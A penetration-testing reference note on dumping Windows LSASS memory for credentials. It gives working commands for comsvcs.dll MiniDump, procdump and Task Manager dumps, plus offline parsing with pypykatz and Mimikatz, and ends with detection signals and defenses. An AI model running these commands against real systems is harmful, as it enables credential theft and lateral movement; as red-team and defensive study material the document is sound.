# LSASS Credential Dumping

The Local Security Authority Subsystem Service (`lsass.exe`) holds the secrets of everyone logged on to a host — NTLM hashes, Kerberos tickets, and, on older or misconfigured systems, cleartext passwords. Dumping LSASS is the single most productive post-escalation action on Windows: once you are SYSTEM (or hold [SeDebugPrivilege](../Token-Privilege-Abuse/SeDebug-Abuse.md)), reading LSASS memory yields credentials that unlock lateral movement across the whole environment. This note covers acquiring the dump; parsing it is covered in Mimikatz Usage and Execution.

## Prerequisites

- Local Administrator / SYSTEM, or `SeDebugPrivilege`:

```cmd
whoami /priv | findstr /i "SeDebug"
```

## Acquire a dump (drop nothing suspicious)

**comsvcs.dll MiniDump** — living-off-the-land, no external tool:

```cmd
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

**procdump** (Microsoft-signed Sysinternals):

```cmd
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

**Task Manager** (GUI): right-click `lsass.exe` → *Create dump file*.

## Parse offline

Move the dump to your attacker box and extract secrets there (avoids running mimikatz on-target):

```bash
pypykatz lsa minidump lsass.dmp
```

Or with Mimikatz:

```text
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## Detection and defenses

- **Detection:** handle opens to `lsass.exe` with `PROCESS_VM_READ`/`0x1010` (Sysmon Event ID 10), `rundll32 comsvcs.dll MiniDump`, `procdump ... lsass`, new `.dmp` files.
- **Defenses:** enable **RunAsPPL** (LSASS protected process), **Credential Guard**, and Attack Surface Reduction rule "Block credential stealing from lsass.exe"; restrict `SeDebugPrivilege`.

## Related
- [Password Mining](Password-Mining.md) — folder hub for credential discovery
- Mimikatz Usage and Execution — parse the dump for hashes, tickets, and plaintext
- [SeDebug Abuse](../Token-Privilege-Abuse/SeDebug-Abuse.md) — the privilege that permits reading LSASS
- Pass The Hash Attack — use recovered hashes without cracking them
- [SAM and SYSTEM files](SAM-and-SYSTEM-files.md) — the on-disk credential source, complementary to LSASS
